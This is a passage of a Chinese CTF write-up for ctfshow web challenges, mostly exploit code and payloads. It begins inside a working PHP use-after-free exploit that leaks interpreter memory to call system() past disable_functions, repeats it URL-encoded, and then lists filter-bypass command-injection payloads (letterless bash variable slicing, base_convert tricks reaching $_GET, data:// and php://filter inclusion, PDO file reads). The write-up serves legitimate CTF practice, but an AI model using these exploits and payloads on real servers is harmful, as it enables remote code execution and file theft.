        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) {

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10;
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4);
    write($abc, 0xd0 + 0x68, $zif_system);

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
```

```html
c=function%20ctfshow(%24cmd)%20%7b%20%20%20%20%20global%20%24abc%2c%20%24helper%2c%20%24backtrace%3b%20%20%20%20%20%20class%20vuln%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%3b%20%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3ea)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20(new%20exception)-%3egettrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5b1%5d%5b'args'%5d))%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20debug_backtrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20class%20helper%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%2c%20%24b%2c%20%24c%2c%20%24d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20str2ptr(%26%24str%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24address%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24j%20%3d%20%24s-1%3b%20%24j%20%3e%3d%200%3b%20%24j--)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3c%3c%3d%208%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7c%3d%20ord(%24str%5b%24p%2b%24j%5d)%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24address%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20ptr2str(%24ptr%2c%20%24m%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24out%20%3d%20%22%22%3b%20%20%20%20%20%20%20%20%20for%20(%24i%3d0%3b%20%24i%20%3c%20%24m%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3d%20sprintf(%22%25c%22%2c(%24ptr%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24out%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20write(%26%24str%2c%20%24p%2c%20%24v%2c%20%24n%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24i%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24str%5b%24p%20%2b%20%24i%5d%20%3d%20sprintf(%22%25c%22%2c(%24v%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20leak(%24addr%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20global%20%24abc%2c%20%24helper%3b%20%20%20%20%20%20%20%20%20write(%24abc%2c%200x68%2c%20%24addr%20%2b%20%24p%20-%200x10)%3b%20%20%20%20%20%20%20%20%20%24leak%20%3d%20strlen(%24helper-%3ea)%3b%20%20%20%20%20%20%20%20%20if(%24s%20!%3d%208)%20%7b%20%24leak%20%25%3d%202%20%3c%3c%20(%24s%20*%208)%20-%201%3b%20%7d%20%20%20%20%20%20%20%20%20return%20%24leak%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20parse_elf(%24base)%20%7b%20%20%20%20%20%20%20%20%20%24e_type%20%3d%20leak(%24base%2c%200x10%2c%202)%3b%20%20%20%20%20%20%20%20%20%20%24e_phoff%20%3d%20leak(%24base%2c%200x20)%3b%20%20%20%20%20%20%20%20%20%24e_phentsize%20%3d%20leak(%24base%2c%200x36%2c%202)%3b%20%20%20%20%20%20%20%20%20%24e_phnum%20%3d%20leak(%24base%2c%200x38%2c%202)%3b%20%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24e_phnum%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3d%20%24base%20%2b%20%24e_phoff%20%2b%20%24i%20*%20%24e_phentsize%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3d%20leak(%24header%2c%200%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3d%20leak(%24header%2c%204%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3d%20leak(%24header%2c%200x10)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3d%20leak(%24header%2c%200x28)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%206)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3d%20%24e_type%20%3d%3d%202%20%3f%20%24p_vaddr%20%3a%20%24base%20%2b%20%24p_vaddr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%205)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20if(!%24data_addr%20%7c%7c%20!%24text_size%20%7c%7c%20!%24data_size)%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%20%20%20%20%20return%20%5b%24data_addr%2c%20%24text_size%2c%20%24data_size%5d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_basic_funcs(%24base%2c%20%24elf)%20%7b%20%20%20%20%20%20%20%20%20list(%24data_addr%2c%20%24text_size%2c%20%24data_size)%20%3d%20%24elf%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24data_size%20%2f%208%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20%24i%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x746e6174736e6f63)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20(%24i%20%2b%204)%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x786568326e6962)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2b%20%24i%20*%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7b%20%20%20%20%20%20%20%20%20%24base%20%3d%200%3b%20%20%20%20%20%20%20%20%20%24start%20%3d%20%24binary_leak%20%26%200xfffffffffffff000%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x1000%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24start%20-%200x1000%20*%20%24i%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24addr%2c%200%2c%207)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3d%3d%200x10102464c457f)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_system(%24basic_funcs)%20%7b%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24basic_funcs%3b%20%20%20%20%20%20%20%20%20do%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3d%20leak(%24addr)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3d%20leak(%24f_entry%2c%200%2c%206)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3d%3d%200x6d6574737973)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2b%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2b%3d%200x20%3b%20%20%20%20%20%20%20%20%20%7d%20while(%24f_entry%20!%3d%200)%3b%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20trigger_uaf(%24arg)%20%7b%20%20%20%20%20%20%20%20%20%20%24arg%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20%20%20%20%24vuln%20%3d%20new%20vuln()%3b%20%20%20%20%20%20%20%20%20%24vuln-%3ea%20%3d%20%24arg%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(stristr(php_os%2c%20'win'))%20%7b%20%20%20%20%20%20%20%20%20die('this%20poc%20is%20for%20*nix%20systems%20only.')%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24n_alloc%20%3d%2010%3b%20%20%20%20%20%20%24contiguous%20%3d%20%5b%5d%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n_alloc%3b%20%24i%2b%2b)%20%20%20%20%20%20%20%20%20%24contiguous%5b%5d%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20trigger_uaf('x')%3b%20%20%20%20%20%24abc%20%3d%20%24backtrace%5b1%5d%5b'args'%5d%5b0%5d%3b%20%20%20%20%20%20%24helper%20%3d%20new%20helper%3b%20%20%20%20%20%24helper-%3eb%20%3d%20function%20(%24x)%20%7b%20%7d%3b%20%20%20%20%20%20if(strlen(%24abc)%20%3d%3d%2079%20%7c%7c%20strlen(%24abc)%20%3d%3d%200)%20%7b%20%20%20%20%20%20%20%20%20die(%22uaf%20failed%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24closure_handlers%20%3d%20str2ptr(%24abc%2c%200)%3b%20%20%20%20%20%24php_heap%20%3d%20str2ptr(%24abc%2c%200x58)%3b%20%20%20%20%20%24abc_addr%20%3d%20%24php_heap%20-%200xc8%3b%20%20%20%20%20%20write(%24abc%2c%200x60%2c%202)%3b%20%20%20%20%20write(%24abc%2c%200x70%2c%206)%3b%20%20%20%20%20%20write(%24abc%2c%200x10%2c%20%24abc_addr%20%2b%200x60)%3b%20%20%20%20%20write(%24abc%2c%200x18%2c%200xa)%3b%20%20%20%20%20%20%24closure_obj%20%3d%20str2ptr(%24abc%2c%200x20)%3b%20%20%20%20%20%20%24binary_leak%20%3d%20leak(%24closure_handlers%2c%208)%3b%20%20%20%20%20if(!(%24base%20%3d%20get_binary_base(%24binary_leak)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20determine%20binary%20base%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24elf%20%3d%20parse_elf(%24base)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20parse%20elf%20header%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24basic_funcs%20%3d%20get_basic_funcs(%24base%2c%20%24elf)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20basic_functions%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24zif_system%20%3d%20get_system(%24basic_funcs)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20zif_system%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%20%24fake_obj_offset%20%3d%200xd0%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x110%3b%20%24i%20%2b%3d%208)%20%7b%20%20%20%20%20%20%20%20%20write(%24abc%2c%20%24fake_obj_offset%20%2b%20%24i%2c%20leak(%24closure_obj%2c%20%24i))%3b%20%20%20%20%20%7d%20%20%20%20%20%20write(%24abc%2c%200x20%2c%20%24abc_addr%20%2b%20%24fake_obj_offset)%3b%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x38%2c%201%2c%204)%3b%20%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x68%2c%20%24zif_system)%3b%20%20%20%20%20%20%20(%24helper-%3eb)(%24cmd)%3b%20%20%20%20%20exit()%3b%20%7d%20%20ctfshow(%22cat%20%2fflag0.txt%22)%3bob_end_flush()%3b%20%3f%3e
```

##### web73

同web74 `flagx.txt`

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit(0); #flagc.txt
c=include("/flagc.txt");die();
```

##### web75

本体同web76一样的做法。

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit(0); #flag36.txt
```

没法像之前那样继续拿flag了，本题通过`include_path`限制了文件包含的路径，无法直接使用`include`包含得到flag信息，参照提示信息使用PDO连接MySQL数据库的方式读取flag信息，payload如下

```php
c=
    try {
        $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
        foreach($dbh->query('select load_file("/flag36.txt")') as $row){
            echo($row[0])."|"; 
            exit(0);
        }
        $dbh = null;}catch (PDOException $e) {
        echo $e->getMessage();
        exit(0);
    }
exit(0); #这官方payload不知道为什么会被过滤 先放着 续:换了google浏览器的hackbar莫名其妙成了
```

##### web77

```php
#这官方payload不知道为什么会被过滤 先放着
```

##### web118

![image-20230418154221753](.\Web-CTF\CTFshow034.png)

```php+HTML
#查看源码
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" href="style.css">
</head>
<body>
    
    <div style="width:400px;height:10px;margin:100px auto">
        <form action='' method=post> 
            <input type='text' name='code' placeholder="给你打开一扇通往结界的窗户，可惜钥匙你是找不到的 ">
        </form>
		<!-- system($code);--> #这里很关键
    </div>
</body>
</html>
```

```sh
#/var/www/html # ls /bin
${PATH} #/bin
${PWD} #/var/www/html
${PATH:~0} #n ~0=-1 即从后向前截取第一位
${PWD:~0} #l
${PATH:~0}${PWD:~0}${IFS}???????? #nl flag.php 发现数字被过滤无法执行
${PATH:~A}${PWD:~A}${IFS}????????  #nl flag.php 
#SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器
echo $SHLVL #输出了2
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.??? #另一种解法
```

拿$PWD举例

```bash
$PWD和${PWD}    #/var/www/html  结果一样
${#PWD}         #13    $PWD的长度
${PWD:3}        #r/www/html 下标3往后的内容
${PWD:~3}    	#html #~3=-4 即从后往前的四个字符的内容
${PWD:3:1}     	#r 下标3往后的内容截取到下标为1处
${PWD:~3:1} 	#h 从后往前的四个字符的内容html截取到下标为1处
${SHLVL:~A} 	#1 A是字符串 转换为数字相当于0
```

拼接出nl

```sh
n:
${PATH:~A}  	n #如果$PATH结尾为n
${PATH:${#TERM}:${SHLVL:~A}}   # n   相当于${PATH:14:1}
l:
${#RANDOM}  # 4或者5
${PATH:${#RANDOM}:${#SHLVL:~A}}  #l
```

##### web119

```sh
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.??? #/bin/cat flag.php
${HOME:${#HOSTNAME}:${#SHLVL}} #t
${PWD:${Z}:${#SHLVL}} #/
```

```sh
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -02 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BI... #下标3开始有tac命令的字符
PHP_VERSION=7.3.22 #拿到版本号中的3
SHLVL=1 #深度 默认为1
${#SHLVL} #求 深度结果 的字符长度 即1
${PHP_VERSION:~$SHLVL} #${PHP_VERSION:~1} ==> ${PHP_VERSION:-2} 得到22
${PHP_VERSION:$SHLVL} #3.22
${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}:${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}} ????.???? #tac flag.php
```

##### web120

```php

<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}
?>
```

```sh
${PWD::${#SHLVL}} #截取/var/www/html中的第一个符号 即/
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.??? #/???/?a? ???.???
#/bin/cat flag.php 回显后查看源码Ctfl+F搜索即可
```

##### web121

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}
?>
```

```sh
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.??? #/bin/rev flag.php
#${PWD:${#IFS}:${#?}} ==> /var/www/html: :1(每次跳一个字符，默认为坐标为1处) ==> r
#}15a3a2ed746a-cd9a-9a74-d080-ed5b9a55{wohsftc 反过来输入即可 rev(reverse)反转一个或多个文件的行
```

##### web122

```sh
#通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误
<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.??? #多刷新几次 最后再使用base64解码
```

##### web124

```php
 <?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```

```php
base_convert  		#在任意进制之间转换数字。
hexdec 			 #把十六进制转换为十进制。
dechex 			#把十进制转换为十六进制。
hex2bin  		#把十六进制的字符串转换为ASCII码
```

构造`$_GET `把参数逃逸出去，转成10进制 多转一层绕过过滤

```php
<?php 
// 把 hex2bin转化为10进制
echo base_convert("hex2bin", 36, 16);   //37907361743
echo "<br>";
echo base_convert("8d3746fcf", 16, 36);  //hex2bin
echo "<br>";
//把_GET 先转为16进制再转为10进制
echo hexdec(bin2hex("_GET"));  //1598506324
echo "<br>";
echo base_convert("8d3746fcf", 16, 36)(dechex("1598506324"));  // 绕过过滤拿到 "_GET"
?>
```

```php
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=cat%20flag.php
```

```sh
$$pi{abs}($$pi{acos})  #相当于 $_GET['abs']($_GET['acos'])
```

##### 总结

###### 过滤不严谨

```sh
nl #读取文件行数num line
`` #执行命令之后记得用echo进行回显
echo 后面要带上;
`` #效果和system作用相似，但是用法不同(echo `` system(''))
%09 #tab键
show_source(next(array_reverse(scandir(pos(localeconv()))))); #无参数函数 PHP函数
passthru() #执行外部程序并且显示原始输出
php://filter/convert.base64-encode/resource=flag.php #利用文件包含
```

###### 绕过空格

```shell
%0a #换行符
%09 #水平定位符
$IFS ${IFS}
<> #需要写的权限
<
%3c #就是<
```

###### 语言结构

```php
可以不使用括号的函数：echo print isset unset require include
PHP可以大写，例如：PHPINFO() PHPinfo() 也可以写成 ('phpinfo')() ("system")("ls")
```

###### system($c)过滤

```sh
过滤 ; 利用%0a && & ||
过滤空格 ${IFS} $IFS$9
%0a 1
nl<fla''g.php #shell特性
```

###### Linux查看文件命令

```shell
cat //cat flag.php
tac //tac flag.php
head //head flag.php
tail //tail flag.php
nl //nl flag.php
more //more flag.php
less //less flag.php
od //od flag.php
grep //grep 'fla' flag.php
strings //strings flag.php
sort //sort flag.php
```

###### 无字母类型

因为过滤了字母，有一个含数字的base64命令可以读文件，用通配符绕过字母，在/bin目录下，使用/???/????64
?c=/bin/base64 flag.php(flag.php全靠猜)
即?c=/???/????64 ????.???

###### 压缩包

bzip2命令是一个压缩文件的命令，压缩文件后缀为.bz2，命令路径：/usr/bin/bzip2
?c=/bin/bzip2 flag.php
即?c=/???/????2 ????.???
压缩后下载，访问/flag.php.bz2。

###### 上传文件

看上面的解析

###### 禁用函数中执行：eval($c)

```php
c=show_source(next(array_reverse(scandir(pos(localeconv())))));
c=echo file_get_contents(flag);
c=include($_GET['1']); ?1=php://filter/convert.base64-encode/resource=flag.php
c=highlight_file('flag.php');
post c=include('flag.php');echo $flag; #(前提是我们知道是在flag.php中，且$flag是flag) 日志执行，实在是看又看不懂
```

###### 查看目录：

```php
print_r(scandir("/"));
var_dump(scandir("/"));
var_export(scandir("/"));#(一般过滤前两个)
```

所使用的命令，因为总结题型不太好，于是就将大部分命令列了出来，看到命令，基本就能够回忆题型

```php
?c=system('cat `ls`');
?c=echo `cat fla*`;
?c=eval（$_GET[a]);&a=system('cat flag.php');
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

?c=include%0a$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
?c=include%0a$_REQUEST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
?c=include%0a$_REQUEST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
?c=include%0a$_REQUEST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
?c=data://text/plain,<?php system("cat fl*");?> 
?c=data://text/plain,<?= system("cat fl*");?>  
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/PiA=

#array_pop获取post传入的phpinfo()，然后eval执行，当确定能够执行之后，将phpinfo()换成system('cat flag.php');
?c=eval（array_pop(next(get_defined_vars())));
post 1=phpinfo()

?c=ls;ls
?c=tac flag.php;ls
?c=tac flag.php%26%26ls %26是&
?c=tac fla*%26
?c=tac${IFS}fla*%26%26
?c=echo${IFS}`tac${IFS}f*`%0A   ${IFS}是空格 %0a是提行
?c=tac%09fla?.php%26%26
?c=tac%09fla?.php%26%26
?c=nl<fla''g.php%7c%7c    $7c是| <是空格
?c=ls${IFS}/||
?c=nl${IFS}/fla?%7c%7c
?c=grep${IFS}'fla'${IFS}fla?.php
